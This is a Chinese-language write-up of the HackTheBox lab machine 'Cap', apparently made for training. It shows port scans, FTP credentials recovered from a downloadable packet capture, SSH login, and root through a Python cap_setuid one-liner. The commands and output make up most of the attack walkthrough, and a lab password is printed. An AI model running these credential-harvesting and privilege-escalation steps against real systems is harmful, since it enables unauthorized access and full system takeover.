---
title: HTB-Cap Writeup
date: 2026-02-08T20:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Writeup
  - HTB
  - Linux
---
> 本文章以 kali 地址为 10.10.17.128 做演示

## 初始侦察

### Nmap 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap --min-rate 10000 -p- 10.129.11.242               
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-08 06:16 EST
Warning: 10.129.11.242 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.11.242
Host is up (0.15s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.74 seconds
```

开放了三个 TCP 端口 21、22 和 80。

### Nmap 详细信息扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap -sT -sC -sV -O -p21,22,80 10.129.11.242                                 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-08 06:17 EST
Nmap scan report for 10.129.11.242
Host is up (0.086s latency).

PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open     http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.25 seconds
```

## FTP 渗透

靶机开放 ftp 服务，尝试使用 anonymous 进行登入。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ ftp 10.129.11.242  
Connected to 10.129.11.242.
220 (vsFTPd 3.0.3)
Name (10.129.11.242:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```

登入失败，接下来进行 80 端口 Web 渗透看看能不能获取些信息。

## Web 渗透

80 端口是一个 wordpress 的 Dashboard 界面，使用的主题是 Colorlib。

![](Pasted%20image%2020260208201108.png)

进入 Security Snapshot 界面发现可以下载 cap流量包，且地址处的 data 后数字每次访问都会改变。

![](Pasted%20image%2020260208201409.png)

猜测 data/0 会有有价值的数据，下载到 kali 中进行分析。

### 流量包分析

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ ls
0.pcap

┌──(kali㉿kali)-[~/Work/Kali]
└─$ tshark -r 0.pcap -V | grep 'ftp'                                  
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
    [Protocols in frame: sll:ethertype:ip:tcp:ftp]
```

发现流量包包含 ftp 的内容，进行更详细的提取。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ tshark -r 0.pcap -Y "ftp.request.command" -T fields -e ftp.request.command -e ftp.request.arg

USER    nathan
PASS    Buck3tH4TF0RM3!
SYST
PORT    192,168,196,1,212,140
LIST
PORT    192,168,196,1,212,141
LIST    -al
TYPE    I
PORT    192,168,196,1,212,143
RETR    notes.txt
QUIT
```

发现 nathan 的账号密码，尝试 ssh。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ ssh nathan@10.129.11.242
nathan@10.129.11.242's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Feb  8 12:20:22 UTC 2026

  System load:           0.0
  Usage of /:            36.7% of 8.73GB
  Memory usage:          34%
  Swap usage:            0%
  Processes:             226
  Users logged in:       0
  IPv4 address for eth0: 10.129.11.242
  IPv6 address for eth0: dead:beef::250:56ff:feb9:883c

  => There are 4 zombie processes.


63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Feb  8 11:38:54 2026 from 10.10.17.128
nathan@cap:~$ whoami
nathan
```

## Linux 提权

进行 sudo 枚举和 suid 枚举未发现可能提权的途径。

```bash
nathan@cap:~$ sudo -l
[sudo] password for nathan: 
Sorry, try again.
[sudo] password for nathan: 
Sorry, user nathan may not run sudo on cap.
nathan@cap:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/chsh
/usr/bin/su
/usr/bin/fusermount
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/snap/snapd/11841/usr/lib/snapd/snap-confine
/snap/snapd/12398/usr/lib/snapd/snap-confine
/snap/core18/2066/bin/mount
/snap/core18/2066/bin/ping
/snap/core18/2066/bin/su
/snap/core18/2066/bin/umount
/snap/core18/2066/usr/bin/chfn
/snap/core18/2066/usr/bin/chsh
/snap/core18/2066/usr/bin/gpasswd
/snap/core18/2066/usr/bin/newgrp
/snap/core18/2066/usr/bin/passwd
/snap/core18/2066/usr/bin/sudo
/snap/core18/2066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2066/usr/lib/openssh/ssh-keysign
/snap/core18/2074/bin/mount
/snap/core18/2074/bin/ping
/snap/core18/2074/bin/su
/snap/core18/2074/bin/umount
/snap/core18/2074/usr/bin/chfn
/snap/core18/2074/usr/bin/chsh
/snap/core18/2074/usr/bin/gpasswd
/snap/core18/2074/usr/bin/newgrp
/snap/core18/2074/usr/bin/passwd
/snap/core18/2074/usr/bin/sudo
/snap/core18/2074/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2074/usr/lib/openssh/ssh-keysign

```

枚举发现 python3.8 可以 setuid。

```bash
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

使用 python 实现提权。

```bash
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# whoami
root
```
